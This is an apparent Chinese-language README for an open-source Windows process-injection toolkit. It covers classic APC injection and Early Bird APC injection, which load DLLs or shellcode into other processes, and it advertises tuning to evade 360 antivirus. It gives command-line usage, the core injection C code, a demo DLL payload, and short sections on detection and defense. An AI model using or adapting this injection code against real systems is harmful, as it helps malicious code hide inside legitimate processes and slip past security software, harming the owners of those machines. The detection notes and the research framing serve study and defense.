# APC-injection

APC注入、早鸟APC注入、加载DLL、执行Shellcode，支持免杀360

## 📋 项目简介

本项目是一个 Windows 进程注入技术集合，实现了多种 APC (Asynchronous Procedure Call) 注入方式，包括传统 APC 注入和 Early Bird APC 注入技术。项目主要用于安全研究和学习 Windows 进程注入机制。

### 主要功能

- ✅ **传统 APC 注入** - 向运行中的进程注入 DLL 或 Shellcode
- ✅ **Early Bird APC 注入** - 在进程创建初期注入，绕过部分安全检测
- ✅ **DLL 加载注入** - 通过 LoadLibrary 加载 DLL
- ✅ **Shellcode 执行** - 直接执行 Shellcode
- ✅ **免杀优化** - 针对 360 等安全软件进行优化

## 🏗️ 项目结构

```
APC-injection/
├── earlyApc/                    # Early Bird APC 注入 (DLL)
│   └── FileName.c
├── EarlyApcShellcode/           # Early Bird APC 注入 (Shellcode)
│   └── earlybird_shellcode_injector.c
├── shellcodeAPC/                # 传统 Shellcode APC 注入
│   └── shellcode_injector.c
├── Project1/                    # 传统 APC 注入 (通过进程名/PID)
│   └── FileName.c
├── APC injection/               # 主项目
│   └── target.c
└── Dll1/                        # 示例 DLL 载荷
    └── dllmain.cpp
```

## 🚀 编译环境

- **开发工具**: Visual Studio 2019/2022
- **平台工具集**: v143
- **支持平台**: Win32, x64, ARM64
- **Windows SDK**: 10.0

### 编译步骤

1. 使用 Visual Studio 打开 `APC injection.sln`
2. 选择目标平台（推荐 x64 Release）
3. 生成解决方案 (Build Solution)

## 📖 使用方法

### 1. Early Bird APC 注入 (DLL)

```bash
# 创建挂起进程并注入 DLL
earlyApc.exe <target_exe_path> <dll_path>

# 示例
earlyApc.exe C:\Windows\System32\notepad.exe payload.dll
```

**特点**:
- 在进程创建时就进行注入，时机更早
- 通过挂起进程的方式，确保 APC 在进程主线程恢复时执行
- 适合绕过部分基于行为检测的安全软件

### 2. 传统 APC 注入 (通过进程名或PID)

```bash
# 通过进程名注入
Project1.exe <process_name>

# 通过 PID 注入
Project1.exe <PID>

# 示例
Project1.exe notepad.exe
Project1.exe 1234
```

**特点**:
- 支持通过进程名或 PID 定位目标进程
- 自动查找进程的主线程
- 需要目标线程进入可警告状态才能执行

### 3. Shellcode APC 注入

```bash
# Shellcode APC 注入 (需要修改代码中的 shellcode)
shellcodeAPC.exe <PID>
```

**特点**:
- 直接执行 Shellcode，无需 DLL 文件
- 更适合免杀场景
- 需要在代码中配置 Shellcode

## 🔧 技术原理

### APC (Asynchronous Procedure Call) 机制

APC 是 Windows 提供的一种异步执行机制，允许线程在特定时机执行回调函数。

#### 传统 APC 注入流程

```
1. 打开目标进程
2. 在目标进程中分配内存
3. 写入 DLL 路径或 Shellcode
4. 获取目标线程句柄
5. 将 APC 函数加入线程的 APC 队列
6. 当线程进入可警告状态时，APC 自动执行
```

#### Early Bird APC 注入流程

```
1. 使用 CREATE_SUSPENDED 创建进程（挂起状态）
2. 在目标进程中分配内存
3. 写入 DLL 路径或 Shellcode
4. 将 APC 加入主线程的 APC 队列
5. 恢复主线程（ResumeThread）
6. 主线程恢复时立即进入可警告状态，APC 执行
```

### Early Bird 注入的优势

- ⚡ **执行时机早** - 在进程初始化早期执行，绕过部分检测
- 🎯 **确定性高** - 不依赖目标线程的自然可警告状态
- 🛡️ **隐蔽性好** - 减少了注入痕迹

## 💡 代码示例

### Early Bird APC 注入核心代码

```c
// 创建挂起进程
CreateProcessA(NULL, targetPath, NULL, NULL, FALSE, 
               CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 在目标进程中分配内存
pRemoteMemory = VirtualAllocEx(pi.hProcess, NULL, pathLen,
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// 写入 DLL 路径
WriteProcessMemory(pi.hProcess, pRemoteMemory, dllPath, pathLen, NULL);

// 获取 LoadLibraryA 地址
pLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

// 将 APC 加入队列
QueueUserAPC((PAPCFUNC)pLoadLibraryA, pi.hThread, (ULONG_PTR)pRemoteMemory);

// 恢复线程，触发 APC 执行
ResumeThread(pi.hThread);
```

### DLL 载荷示例

```cpp
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL, "APC注入成功！", "APC注入演示", MB_OK);
        break;
    }
    return TRUE;
}
```

## ⚠️ 注意事项

### 使用限制

1. **需要管理员权限** - 部分注入方式需要管理员权限
2. **目标线程状态** - 传统 APC 注入需要目标线程进入可警告状态（SleepEx, WaitForSingleObjectEx 等）
3. **进程保护** - 无法注入受保护的进程（如 lsass.exe 等系统关键进程）
4. **仅用于学习** - 本工具仅用于安全研究和学习目的

### 免杀说明

- 本项目包含针对 360 安全软件的优化
- 免杀效果会因安全软件版本更新而变化
- 建议结合实际场景进行测试和优化

## 🔍 检测与防御

### 如何检测 APC 注入

1. **进程监控** - 监控可疑的进程创建和内存分配
2. **APC 队列检查** - 检查线程的 APC 队列异常
3. **DLL 加载监控** - 监控异常的 DLL 加载行为
4. **行为分析** - 分析进程的异常行为模式

### 防御措施

- 使用进程保护机制（PPL）
- 启用 EDR/终端检测与响应系统
- 监控线程 APC 队列
- 限制进程创建权限

## 📚 相关资源

### 参考资料

- [Microsoft - QueueUserAPC](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
- [APC Injection - MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/004/)
- Early Bird APC Injection 技术文档

### 相关项目

- [Process Hacker](https://github.com/processhacker/processhacker) - 进程分析工具
- [DLL Injection](https://github.com/fdiskyou/injectAllTheThings) - 各种注入技术集合

## 📄 许可证

本项目仅用于教育和研究目的。请遵守相关法律法规，不得用于非法用途。

## 🤝 贡献

欢迎提交 Issue 和 Pull Request！

## ⭐ Star History

如果这个项目对你有帮助，欢迎给个 Star ⭐

---

**免责声明**: 本工具仅用于授权的安全测试和研究目的。使用者需自行承担使用风险，作者不对任何滥用行为负责。
